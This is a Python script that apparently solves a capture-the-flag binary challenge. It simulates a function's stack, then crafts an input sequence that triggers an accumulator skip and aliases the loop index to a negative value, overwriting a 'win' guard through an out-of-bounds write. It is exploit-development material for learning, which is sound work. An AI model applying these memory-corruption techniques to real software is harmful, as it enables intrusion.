#!/usr/bin/env python3
# Faithful simulator of challenge() memory to craft the exact input sequence.
# Layout (from disasm): rbp-0x30=win, rbp-0x2c=numbers[0], numbers[i] at rbp-0x2c+4i,
#   accum=rbp-0x8 (=numbers[9]), i=rbp-0x4 (=numbers[10]), savedRBP=rbp (=numbers[11]),
#   retlo=rbp+8 (=numbers[13]), rethi=rbp+0xc (=numbers[14]).
# Model the stack as a dict of int-slots indexed by "numbers index" n where slot addr = rbp-0x2c+4n.
# win is at n=-1. accum n=9, i n=10, savedrbp n=11, pad n=12, ret_lo n=13, ret_hi n=14.

import struct

WIN_ADDR = 0x401216  # from local build; remote differs if PIE. This build is no-pie.

def simulate(inputs, verbose=False):
    # slots keyed by index n (can be negative). Initialize win.
    slot = {}
    slot[-1] = 0x67          # win
    slot[10] = 0             # i variable lives here (numbers[10]); starts 0
    slot[9]  = 0             # accum (numbers[9]); starts 0
    # Actually i and accum are separate C vars but ALIAS numbers[10]/[9]. We model reads/writes
    # to those C vars as reads/writes of slot[10]/slot[9].
    def get_i(): return slot.get(10,0)
    def set_i(v): slot[10]= v & 0xffffffff
    def get_accum(): return slot.get(9,0)
    def set_accum(v): slot[9]= v & 0xffffffff

    set_i(0); set_accum(0)
    inp = list(inputs)
    steps=0
    trace=[]
    while True:
        i = get_i()
        if i == 7:      # while(i != 7)
            break
        steps+=1
        if steps>200:
            trace.append("RUNAWAY"); break
        if not inp:
            trace.append(f"EOF at i={i}"); break
        val = inp.pop(0) & 0xffffffff
        # write numbers[i] = val  (slot[i]=val) ; NOTE if i==10 this sets the i variable; if i==9 sets accum
        slot[i] = val
        # accum += numbers[i]   -> reads slot[i] (the value just written) ; but accum may have been overwritten if i==9
        a = get_accum()
        a = (a + slot[i]) & 0xffffffff
        set_accum(a)
        if verbose: trace.append(f"i={i} wrote slot[{i}]={val:#x} accum={get_accum():#x}")
        # if accum==67: i++
        if get_accum() == 67:
            set_i((get_i()+1)&0xffffffff)
            if verbose: trace.append("  accum==67 -> i++")
        # i++
        set_i((get_i()+1)&0xffffffff)
    return slot, trace

def s32(v):
    v&=0xffffffff
    return v-0x100000000 if v>=0x80000000 else v

# GOAL: set slot[13]=WIN low, slot[14]=WIN high (overwrite return address) -> ret2win.
# We must navigate i from 0 upward. Key: writing slot[10] sets `i` directly (next value).
# Plan: fill i=0..8 normally (each i++ by 1), keeping accum != 67 so no accidental skip,
#   then at i=9 we WRITE accum (slot[9]); at i=10 we WRITE i (slot[10]) to jump to 12, so after
#   the trailing i++ we go to 13. Then write slot[13]=lo (i becomes 14), slot[14]=hi (i becomes 15),
#   then we need loop to end: i != 7 stays true forever -> but ret happens only on normal return.
#   Actually the function must RETURN normally (hit i==7) for ret2win via saved RIP. But i is huge now.
#   Hmm: to return, the while must exit (i==7). But we jumped i high. It won't hit 7 -> infinite.
#   ALTERNATIVE: overwrite `i` (slot[10]) with 7 to END the loop cleanly, but then we can't write ret.
# Rethink: We can set i to any value by writing slot[10]. Sequence:
#   - advance to i=10 (writing slots 0..10). When we WRITE slot[10]=X, that sets i=X. Then accum check,
#     then i++ => i = X+1. So to next-write slot[13], set X=12 => i becomes 13.
#   - write slot[13]=lo => then i++ => 14 ; write slot[14]=hi => i++ =>15
#   - now set... we can't write slot[10] again (already past). To end loop, we need i==7. Cannot.
#   => So returning normally won't happen. BUT we don't need normal return to use ret address if the
#      function never returns. So ret2win won't fire.
# BETTER GOAL: forget ret address. Overwrite the *local win check*? win is at n=-1 (can't reach up).
# WAIT: we can set i to a NEGATIVE value by writing slot[10] = negative! Then numbers[i] writes DOWNWARD.
#   Set slot[10] = -2 (i=-2), then i++ => i=-1 => next write is slot[-1] = WIN!  Write slot[-1]=anything!=0x67
#   Then need loop to end: after writing slot[-1], i++ => 0, ... we can then also fix i to 7 to exit.
# This is the intended solve: use the index-aliasing to set i negative and overwrite `win`.

# Craft: reach i=10 writing benign values (accum controlled != 67), write slot[10] = (-2) so i-> -1 next,
# then write slot[-1] = 0 (win!=0x67), then continue; set i to 7 to exit loop.
# But after writing slot[-1] at i=-1, i++ => 0, loop continues from 0 upward again (re-writing!). Messy.
# Cleaner: when at i=10, write slot[10] = 6  => i becomes 7 after ++ => loop EXITS.
#   But we still must have set win first. Set win BEFORE reaching i=10:
#   We can set i negative earlier. Let's do: get to i=... hmm we can only set i by writing slot[10],
#   which requires i==10 first (normal ascent 0..10).
# So: ascend i=0..9 (10 writes) with benign vals; at i=10 write slot[10] = -2 -> after ++ i=-1;
#   at i=-1 write slot[-1]=0 (WIN cleared!) -> after ++ i=0; ascend again 0..10... infinite unless
#   we break. On the SECOND time at i=10, write slot[10]=6 -> ++ -> i=7 -> loop exits. win already 0.
#   But second ascent re-writes slots 0..9 and importantly slot[9]=accum, slot[10]. Fine.
#   Also must keep accum != 67 throughout to avoid stray skips (skips just do extra i++, manageable but
#   let's just avoid 67).
# Let's just brute-simulate a concrete input list.

def build():
    seq=[]
    # The loop naturally exits at i==7. To get OOB we MUST trigger accum==67 (0x43) skip so i:6->8.
    # i=0..5: write values summing to something, then at i=6 make accum hit 67 exactly.
    # Use: numbers[0..5] = 0 (accum stays 0), numbers[6] = 67 -> accum=67 -> skip -> i=6 ->(++,++)-> 8.
    for _ in range(0,6):   # i=0..5  (accum stays 0)
        seq.append(0)
    seq.append(67)         # i=6: accum=67 -> triggers skip -> i becomes 8
    # Now i=8. i=8 writes slot[8] (benign). accum stays 67 -> would re-trigger! Must break 67 now.
    # But at i=8 we write slot[8], accum += slot[8]. To avoid re-trigger set slot[8] big so accum!=67.
    seq.append(1000)       # i=8: accum = 67+1000=1067 (no re-skip). i++ -> 9
    # i=9: writing slot[9] OVERWRITES accum var. Set it to big value (avoid 67). accum becomes slot9+prev?
    #   code: numbers[9]=val (slot9=val); accum += numbers[9] => accum = val + val? No: accum var lives
    #   in slot9 too. After write slot9=val, accum(=slot9)=val; then accum += slot9 => accum=2*val.
    #   pick val=1000 -> accum=2000 (!=67). i++ -> 10
    seq.append(1000)       # i=9: accum -> 2000
    # i=10: write slot[10] = i-variable = -2. Then accum += slot[10]?? accum(slot9)=2000; slot10=-2;
    #   accum += numbers[10](=-2) => 1998. Then accum!=67. Then i++ -> i = -2+1 = -1.
    seq.append(-2)         # i=10: sets i=-2 -> after ++ -> i=-1
    # i=-1: write slot[-1] = WIN field = 0 (clear 0x67). accum += 0. i++ -> 0.
    seq.append(0)          # i=-1: win=0
    # Now i=0. Loop continues; naturally ascends and will EXIT at i==7 (accum won't be 67 now: it's
    #   whatever; we must ensure no accidental 67). After the win write, accum was 1998 then +0 =1998.
    #   Ascend i=0..6 writing 0 (accum stays 1998), i=7 -> but wait numbers[7] gets written? i goes
    #   0,1,..6 then i++ ->7 exits. numbers[0..6] rewritten with 0. accum stays 1998. Exit at i=7.
    for _ in range(0,7):   # i=0..6 (7 writes), then i becomes 7 -> exit
        seq.append(0)
    return seq

seq = build()
slot, trace = simulate(seq, verbose=True)
print("final win (slot[-1]) =", hex(slot.get(-1,0)))
print("WIN?" , "YES" if slot.get(-1,0)!=0x67 else "NO (lose)")
print("input count:", len(seq))
print("\n".join(trace[-40:]))
print("\nINPUT_SEQUENCE:")
print(" ".join(str(x) for x in seq))
